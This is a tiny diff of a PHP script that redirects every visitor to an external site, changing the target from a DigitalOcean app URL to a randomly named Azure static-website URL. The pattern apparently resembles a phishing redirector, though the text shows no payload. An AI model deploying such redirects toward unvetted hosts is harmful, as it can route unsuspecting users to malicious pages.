@@ -1,7 +1,7 @@
 <?php
  
 // Redirect browser
-header("Location: https://seashell-app-rpkfr.ondigitalocean.app/");
+header("Location: https://mazxxingggg.z13.web.core.windows.net/");
  
 exit;
 ?>
